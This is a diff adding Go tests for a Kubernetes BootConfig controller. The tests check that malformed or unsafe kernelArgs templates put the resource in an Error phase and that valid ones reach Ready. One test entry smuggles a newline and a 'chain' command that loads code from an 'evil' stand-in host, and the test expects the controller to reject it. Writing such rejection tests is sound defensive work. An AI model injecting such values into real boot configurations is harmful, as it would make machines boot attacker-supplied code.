@@ -434,6 +434,51 @@ var _ = Describe("BootConfig Controller", func() {
 			Expect(info.ModTime()).To(Equal(modTime))
 		})
 
+		DescribeTable("should set Error for kernelArgs that cannot be rendered",
+			func(bcName, kernelArgs, wantMessage string) {
+				cleanup := setupReadyPair(bcName+"-kernel", bcName+"-initrd")
+				defer cleanup()
+				bc := &isobootgithubiov1alpha1.BootConfig{
+					Name: bcName, Namespace: "default",
+					Spec: isobootgithubiov1alpha1.BootConfigSpec{
+						Netboot:    &isobootgithubiov1alpha1.BootConfigNetbootSpec{KernelRef: bcName + "-kernel", InitrdRef: bcName + "-initrd"},
+						KernelArgs: kernelArgs,
+					},
+				}
+				Expect(k8sClient.Create(ctx, bc)).To(Succeed())
+				defer deleteResource(bcName)
+
+				_, err := doReconcile(bcName)
+				Expect(err).NotTo(HaveOccurred())
+				status := getStatus(bcName)
+				Expect(status.Phase).To(Equal(isobootgithubiov1alpha1.BootConfigPhaseError))
+				Expect(status.Message).To(ContainSubstring("invalid kernelArgs"))
+				Expect(status.Message).To(ContainSubstring(wantMessage))
+			},
+			Entry("removed variable", "bc-args-isourl", "ip=dhcp url={{.ISOURL}}", "ISOURL"),
+			Entry("syntax error", "bc-args-syntax", "ip=dhcp ks={{.ProvisionAutomationBaseURL", "kernelArgs"),
+			Entry("line break", "bc-args-newline", "ip=dhcp\nchain http://example.com/evil", "line"),
+		)
+
+		It("should be Ready with kernelArgs using every variable", func() {
+			cleanup := setupReadyPair("bc-args-ok-kernel", "bc-args-ok-initrd")
+			defer cleanup()
+			bc := &isobootgithubiov1alpha1.BootConfig{
+				Name: "bc-args-ok", Namespace: "default",
+				Spec: isobootgithubiov1alpha1.BootConfigSpec{
+					Netboot: &isobootgithubiov1alpha1.BootConfigNetbootSpec{KernelRef: "bc-args-ok-kernel", InitrdRef: "bc-args-ok-initrd"},
+					KernelArgs: "ks={{.ProvisionAutomationBaseURL}}/ks.cfg {{if .ProxyURL}}proxy={{.ProxyURL}}{{end}} " +
+						"status={{.UpdatePhaseURL}} name={{.ProvisionName}} root={{.NFSRoot}}",
+				},
+			}
+			Expect(k8sClient.Create(ctx, bc)).To(Succeed())
+			defer deleteResource("bc-args-ok")
+
+			_, err := doReconcile("bc-args-ok")
+			Expect(err).NotTo(HaveOccurred())
+			Expect(getStatus("bc-args-ok").Phase).To(Equal(isobootgithubiov1alpha1.BootConfigPhaseReady))
+		})
+
 		It("should set Pending when firmware artifact is not Ready", func() {
 			kernelName := "bc-fwpend-kernel"
 			initrdName := "bc-fwpend-initrd"
